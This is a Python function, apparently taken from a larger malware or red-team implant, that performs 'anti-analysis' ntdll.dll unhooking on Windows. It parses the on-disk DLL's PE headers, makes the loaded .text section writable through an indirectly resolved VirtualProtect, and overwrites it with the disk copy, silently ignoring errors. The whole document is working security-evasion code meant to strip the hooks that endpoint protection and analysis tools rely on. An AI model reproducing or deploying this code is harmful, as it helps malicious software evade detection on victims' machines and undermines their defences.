def unhook_ntdll():
    """Anti-Analysis: User-Mode API Unhooking"""
    if os.name == 'nt':
        PyLog("Anti-Analysis: Attempting to unhook ntdll.dll...")
        try:
            kernel32 = ctypes.windll.kernel32
            ntdll_base = kernel32.GetModuleHandleW("ntdll.dll")
            if not ntdll_base: return
            with open(os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'ntdll.dll'), "rb") as f:
                disk_bytes = f.read()
            e_lfanew = struct.unpack_from('<I', disk_bytes, 0x3C)[0]
            num_sections = struct.unpack_from('<H', disk_bytes, e_lfanew + 6)[0]
            size_of_optional_header = struct.unpack_from('<H', disk_bytes, e_lfanew + 20)[0]
            section_offset = e_lfanew + 24 + size_of_optional_header
            vp_addr = resolve_api("kernel32.dll", "VirtualProtect")
            VirtualProtect = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong))(vp_addr)
            for i in range(num_sections):
                section_hdr = disk_bytes[section_offset + (i * 40): section_offset + (i * 40) + 40]
                name = section_hdr[0:8].rstrip(b'\x00')
                if name == b'.text':
                    virtual_size = struct.unpack_from('<I', section_hdr, 8)[0]
                    virtual_address = struct.unpack_from('<I', section_hdr, 12)[0]
                    raw_data_size = struct.unpack_from('<I', section_hdr, 16)[0]
                    raw_data_ptr = struct.unpack_from('<I', section_hdr, 20)[0]
                    mem_addr = ntdll_base + virtual_address
                    old_protect = ctypes.c_ulong()
                    VirtualProtect(mem_addr, virtual_size, 0x40, ctypes.byref(old_protect))
                    ctypes.memmove(mem_addr, disk_bytes[raw_data_ptr:raw_data_ptr + raw_data_size], raw_data_size)
                    VirtualProtect(mem_addr, virtual_size, old_protect, ctypes.byref(old_protect))
                    PyLog("Anti-Analysis: ntdll.dll .text section patched from disk.")
                    break
        except:
            pass
